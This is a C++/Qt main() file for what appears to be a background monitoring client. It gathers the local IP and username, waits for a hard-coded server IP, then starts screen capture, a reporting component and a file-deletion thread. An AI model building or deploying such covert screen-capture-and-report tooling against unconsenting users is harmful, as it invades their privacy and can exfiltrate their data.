#pragma execution_character_set("utf-8")
#include "InnerImpl.h"
#include "ScreenCapture.h"
#include "mainwindow.h"
#include "global.h"
#include "ReportCenter.h"
#include "FileDeletionThread.h"
const QString SERVER_IP_ADDRESS = "39.106.64.6";
int main(int argc, char *argv[]) {
    // 设置控制台的字符编码为UTF-8
    QTextCodec::setCodecForLocale(QTextCodec::codecForName("UTF-8"));
    QApplication a(argc, argv);
    // 设置应用程序属性，隐藏窗口
    QApplication::setAttribute(Qt::AA_DontShowIconsInMenus);
    // 检查是否已经存在进程实例
    if (InnerImpl::IsAnotherInstanceRunning()) {
        QString tipInfo("There is already an instance running.");
        qDebug() << tipInfo;
        //QMessageBox::warning(nullptr, "WARN", tipInfo);
        getchar();
        return 0;
    }
    QTranslator translator;
    const QStringList uiLanguages = QLocale::system().uiLanguages();
    for (const QString &locale : uiLanguages) {
        const QString baseName = "XFormProject_" + QLocale(locale).name();
        if (translator.load(":/i18n/" + baseName)) {
            a.installTranslator(&translator);
            break;
        }
    }
    InnerImpl::GetCurrentIPandUsername();
    InnerImpl::GeneralLocalStorageDir();
    //判断当前计算机是否联网状态
    while(true) {
        if(InnerImpl::IsNetworkConnected(SERVER_IP_ADDRESS)) {
            if(OUT_TRACE_INFO) {
                qDebug() << "network is connected. server addr:" << SERVER_IP_ADDRESS;
            }
            break;
        } else {
            if(OUT_TRACE_INFO) {
                qDebug() << "network is not connected. server addr:" << SERVER_IP_ADDRESS;
            }
        }
        qDebug() << "retry";
        QThread::msleep(10000);
    }
    ScreenCapture screenCapture;
    QString directoryPath = InnerImpl::storage_dir_;
    ReportCenter reportCenter;
    reportCenter.start(directoryPath);
    FileDeletionThread deletionThread;
    deletionThread.start();
    return a.exec();
}
